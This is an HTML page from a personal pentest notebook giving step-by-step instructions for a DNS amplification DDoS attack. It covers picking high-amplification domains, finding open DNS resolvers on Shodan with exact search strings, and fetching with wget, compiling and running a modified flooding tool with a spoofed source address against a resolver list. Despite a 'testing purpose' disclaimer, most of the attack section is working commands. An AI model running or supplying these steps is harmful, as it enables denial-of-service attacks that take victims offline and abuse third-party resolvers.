<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>botnet: which domain and DNS use?</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>botnet: which domain and DNS use?</h1><br /><br /><strong>Which domains use?</strong><br />• TLD
    domains<br />• domains that use DNSSEC (e.g.: cloudflare.com)<br />usually are the most requested domain names by
    malicious users.<br />Because of these domains cover a large zone they have a lot of input that increase the
    received message that consequentially increase the amplification factor.<br />
    <div class="codebox">
      <div class="codebox">dig&nbsp;@45.156.201.87&nbsp;ads&nbsp;-t&nbsp;ANY</div>
    </div><br /> <a href=""><img src="images/1028-1.png" alt="images/1028-1.png" /></a><br />When we set up the
    amplification module scanner/dns/dns_amp to test, we have to insert the TLD or domains that use DNSSEC without the
    dot like that:<br />
    <div class="codebox">
      <div class="codebox">set&nbsp;domainname&nbsp;ads</div>
    </div><br /><br /><strong>Which DNS Open resolver use?</strong><br />To find them it is possible to search on shodan
    for DNS open resolver.<br />Go to <a href="https://www.shodan.io/" target="_blank">https://www.shodan.io/</a> login and search for
    “port:53 Recursion: enabled 9.3.2” or “port:53 Recursion: enabled dnsmasq-2.40” <br />*BIND 9.3.2 by default is set
    to do recursive delegation<br /><a href=""><img src="images/1028-2.png"
        alt="images/1028-2.png" /></a><br /><br /><br /><strong>How do a DDOS attack(only for testing
      purpose!)</strong><br />With the edited script of Noptrix of Nullsecurity: <a
      href="https://raw.githubusercontent.com/nullsecuritynet/tools/master/dos/dnsdrdos/release/dnsdrdos.c" target="_blank">https://raw.githubusercontent.com/nullsecuritynet/tools/master/dos/dnsdrdos/release/dnsdrdos.c</a><br />I
    have edited it to amplify the results to have bigger responses<br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;makedir&nbsp;ddos<br />root@kali:/#&nbsp;wget&nbsp;https://raw.githubusercontent.com/DenFox93/DNS-Amplification-DDOS-attack/main/dnsdrdosV2.c<br />root@kali:/#&nbsp;gcc&nbsp;dnsdrdosV2.c&nbsp;-o&nbsp;dnsdrdosV2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#compile<br />root@kali:/#&nbsp;./dnsdrdosV2&nbsp;-H&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#manual<br />
      </div>
    </div><br /> <a href=""><img src="images/1028-3.png" alt="images/1028-3.png" /></a><br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;gedit&nbsp;servers.txt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#here&nbsp;we&nbsp;insert&nbsp;the&nbsp;DNS&nbsp;open&nbsp;resolvers&nbsp;taken&nbsp;from&nbsp;shodan<br />root@kali:/#&nbsp;./dnsdrdosV2&nbsp;-f&nbsp;servers.txt&nbsp;-s&nbsp;192.168.1.122&nbsp;-d&nbsp;org&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#we&nbsp;are&nbsp;spoofing&nbsp;the&nbsp;source&nbsp;address&nbsp;with&nbsp;192.168.1.122<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#in&nbsp;this&nbsp;way,&nbsp;192.168.1.122&nbsp;will&nbsp;become&nbsp;our&nbsp;target<br />root@kali:/#
      </div>
    </div><br /> <br />What part of the code of the script i have edited → <a
      href="etwork_Pentest--Vulnerability_assessment--Manual_Testing--DNS--DNS_Amplification_Attack--botnet_which_domain_and_DNS_use--Edit_dnsdrdos.c.html">edit
      dnsdrdos.c</a> <br />Original code: <a
      href="https://raw.githubusercontent.com/nullsecuritynet/tools/master/dos/dnsdrdos/release/dnsdrdos.c" target="_blank">https://raw.githubusercontent.com/nullsecuritynet/tools/master/dos/dnsdrdos/release/dnsdrdos.c</a><br />You
    can find the edited code here: <a
      href="https://github.com/DenFox93/DNS-Amplification-DDOS-attack" target="_blank">https://github.com/DenFox93/DNS-Amplification-DDOS-attack</a><br /><br /><br /><br /><br /><br />Bibliography:<br />•
    <a
      href="https://www.researchgate.net/publication/264728528_Fingerprinting_Internet_DNS_Amplification_DDoS_Activities" target="_blank">https://www.researchgate.net/publication/264728528_Fingerprinting_Internet_DNS_Amplification_DDoS_Activities</a>
  </div>
</body>

</html>